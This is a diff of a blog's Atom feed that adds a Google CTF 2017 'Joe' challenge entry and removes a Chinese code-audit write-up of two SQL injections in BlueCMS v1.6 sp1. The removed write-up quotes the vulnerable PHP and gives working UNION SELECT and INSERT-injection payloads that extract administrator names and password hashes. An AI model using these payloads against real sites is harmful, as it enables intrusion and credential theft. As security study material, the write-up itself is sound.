@@ -106,6 +106,25 @@
   </entry>
   
   <entry>
+    <title>Google CTF 2017-web-writeup</title>
+    <link href="http://yoursite.com/2017/06/22/Google-CTF-2017-web-writeup/"/>
+    <id>http://yoursite.com/2017/06/22/Google-CTF-2017-web-writeup/</id>
+    <published>2017-06-22T08:10:28.000Z</published>
+    <updated>2017-06-22T08:11:59.172Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Joe"><a href="#Joe" class="headerlink" title="Joe"></a>Joe</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Meet our brand new personal assistant, Joe. He is the perfect talking partner if you want to have some small talk with a machine. We have put extra emphasis on security when developing Joe, but we&apos;d like to invite you to participate in our H4x0r R3w4rd Pr06r4m (HRP) to help us make Joe even more secure. If you can find a vulnerability that makes it possible to steal the cookies of the administrator, we will reward you with a valuable flag.</div><div class="line"></div><div class="line">Challenge running at https://joe.web.ctfcompetition.com/</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;Joe&quot;&gt;&lt;a href=&quot;#Joe&quot; class=&quot;headerlink&quot; title=&quot;Joe&quot;&gt;&lt;/a&gt;Joe&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;d
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>GCTF-web-writeup</title>
     <link href="http://yoursite.com/2017/06/19/GCTF-web-writeup/"/>
     <id>http://yoursite.com/2017/06/19/GCTF-web-writeup/</id>
@@ -961,88 +980,6 @@
     
     </summary>
     
-    
-  </entry>
-  
-  <entry>
-    <title>代码审计之SQL注入：BlueCMSv1.6 sp1</title>
-    <link href="http://yoursite.com/2017/03/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9ABlueCMSv1-6-sp1/"/>
-    <id>http://yoursite.com/2017/03/14/代码审计之SQL注入：BlueCMSv1-6-sp1/</id>
-    <published>2017-03-14T11:39:02.000Z</published>
-    <updated>2017-04-01T13:07:44.515Z</updated>
-    
-    <content type="html"><![CDATA[<p>代码审计学习<br><a id="more"></a></p>
-<h1 id="工具及环境"><a href="#工具及环境" class="headerlink" title="工具及环境"></a>工具及环境</h1><ul>
-<li>bluecms v2.1 sp1<br>链接：<a href="http://pan.baidu.com/s/1dFKLanR" target="_blank" rel="external">http://pan.baidu.com/s/1dFKLanR</a> 密码：8v1c</li>
-<li>seay审计系统<br>链接：<a href="http://pan.baidu.com/s/1dENS4KT" target="_blank" rel="external">http://pan.baidu.com/s/1dENS4KT</a> 密码：rszt</li>
-<li>环境<br>PHP: 5.4.45<br>MYSQL: 5.5.53</li>
-</ul>
-<h1 id="注入一"><a href="#注入一" class="headerlink" title="注入一"></a>注入一</h1><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>用seay审计系统审计一下,定位到/ad_js.php。<br><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms1.jpg" alt=""></p>
-<p>该条语句为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ad = $db-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.$ad_id);</div></pre></td></tr></table></figure></p>
-<p>getone()是自定义的函数，用来查询数据库，代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getone</span><span class="params">($sql, $type=MYSQL_ASSOC)</span></span>&#123;</div><div class="line">  $query = <span class="keyword">$this</span>-&gt;query($sql,<span class="keyword">$this</span>-&gt;linkid);</div><div class="line">  $row = mysql_fetch_array($query, $type);</div><div class="line">  <span class="keyword">return</span> $row;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>回到ad_js.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.$ad_id</div></pre></td></tr></table></figure></p>
-<p>可见这里的变量 $ad_id 没有单引号保护。接下来看看这个变量的来源。<br><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms2.jpg" alt=""></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">'ad_id'</span>]) ? trim($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</div></pre></td></tr></table></figure>
-<p>若通过GET获得ad_id则去除它两边的空白字符，否则为空。在获得了ad_id值后，接下来就直接将$ad_id送入了查询语句，没有做任何过滤，因此这里存在注入。</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><ul>
-<li><p>先查询列数</p>
-<p>  /ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6<br>  报错</p>
-</li>
-</ul>
-<p><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms3.jpg" alt=""></p>
-<pre><code>ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,7,8
-报错
-</code></pre><p><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms4.jpg" alt=""></p>
-<pre><code>ad_js.php?ad_id=1+UNION+SELECT+1,2,3,4,5,6,7
-无报错，且查看源代码发现数字7有回显。
-</code></pre><p><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms6.jpg" alt=""></p>
-<ul>
-<li>提取数据<br>利用元数据表爆出表名<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ad_js.php?ad_id=1+UNION+SELECT+1,2,3,4,5,6,GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database()</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms9.jpg" alt=""></p>
-<ul>
-<li><p>爆出字段</p>
-<p>  ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,GROUP_CONCAT(column_name) from information_schema.columns where table_name=0x626c75655f61646d696e<br><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms10.jpg" alt=""></p>
-</li>
-<li><p>获取用户名密码</p>
-<p>  ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,GROUP_CONCAT(admin_name,0x3a,pwd) FROM blue_admin<br><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms10.jpg" alt=""></p>
-</li>
-</ul>
-<h1 id="注入二"><a href="#注入二" class="headerlink" title="注入二"></a>注入二</h1><h2 id="审计-1"><a href="#审计-1" class="headerlink" title="审计"></a>审计</h2><p>函数定位：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>))</div><div class="line">	&#123;</div><div class="line">		$ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>))</div><div class="line">	&#123; <span class="comment">//????????????????????????????ip ???</span></div><div class="line">		$ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED'</span>))</div><div class="line">	&#123;</div><div class="line">		$ip = getenv(<span class="string">'HTTP_X_FORWARDED'</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>))</div><div class="line">	&#123;</div><div class="line">		$ip = getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED'</span>))</div><div class="line">	&#123;</div><div class="line">		$ip = getenv(<span class="string">'HTTP_FORWARDED'</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span></div><div class="line">	&#123;</div><div class="line">		$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> $ip;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>直接获取了ip，并没有验证IP格式，因此我们可以伪造ip。查看一下有哪些位置调用了 getip() ，<br><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms13.jpg" alt=""></p>
-<h2 id="comment-php页面"><a href="#comment-php页面" class="headerlink" title="comment.php页面"></a>comment.php页面</h2><p>其中有如下代码</p>
-<pre><code>$sql = &quot;INSERT INTO &quot;.table(&#39;comment&#39;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES (&#39;&#39;, &#39;$id&#39;, &#39;$user_id&#39;, &#39;$type&#39;, &#39;$mood&#39;, &#39;$content&#39;, &#39;$timestamp&#39;, &#39;&quot;.getip().&quot;&#39;, &#39;$is_check&#39;)&quot;;
-$db-&gt;query($sql);
-</code></pre><p>可以看到，这里执行了INSERT语句，且调用了getip()，这里存在注入。</p>
-<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>这是目前的留言板：<br><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms17.jpg" alt=""></p>
-<p>在burp截包后，post参数如下：<br><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms16.jpg" alt=""><br>所以</p>
-<pre><code>user_id=2
-id=6 即 post_id=6 对应发表留言的文章id
-type=1
-mood=6 （这个无关紧要）
-</code></pre><p>为了能让把管理员账号和密码回显出来，我们不能直接在getip()的位置上直接去查询。在前面的sql语句中，content变量是会回显到页面上的，这里利用这个位置去构造payload。</p>
-<p>payload如下：</p>
-<pre><code>1&#39;,&#39;1&#39;),(&#39;&#39;,&#39;6&#39;,&#39;2&#39;,&#39;1&#39;,&#39;6&#39;,(select concat(admin_name,&#39;:&#39;,pwd) from blue_admin),&#39;1&#39;,&#39;1
-</code></pre><p>payload分析：1’,’1’)是为了完成第一次插入，之后的（）是为了完成第二次插入，前面的 ‘’,’6’,’2’,’1’,’6’ 是与第一个插入语句的参数相对应。接下来，我们把查询到的账号密码放在了第六个参数即content位置，这样能实现回显。而最后的 ‘1’,’1  是要满足列数相等否则会出错，同时要注意闭合原本语句中的单引号，其中第一个 1 对应sql语句中的$timestamp，表示发表时间，这个无关紧要。</p>
-<p>所以这样插入后完整的sql语句是：</p>
-<pre><code>$sql = INSERT INTO &quot;.table(&#39;comment&#39;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check)
-  VALUES (&#39;&#39;, &#39;$id&#39;, &#39;$user_id&#39;, &#39;$type&#39;, &#39;$mood&#39;, &#39;$content&#39;, &#39;$timestamp&#39;, &#39;1&#39;,&#39;1&#39;),(&#39;&#39;,&#39;6&#39;,&#39;2&#39;,&#39;1&#39;,&#39;6&#39;,(select concat(admin_name,&#39;:&#39;,pwd) from blue_admin),&#39;1&#39;,&#39;1&#39;, &#39;$is_check&#39;)&quot;;
-</code></pre><p><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms18.jpg" alt=""><br>Forward后 注入成功。<br><img src="http://ojp0pjljj.bkt.clouddn.com/bluecms20.jpg" alt=""></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;代码审计学习&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
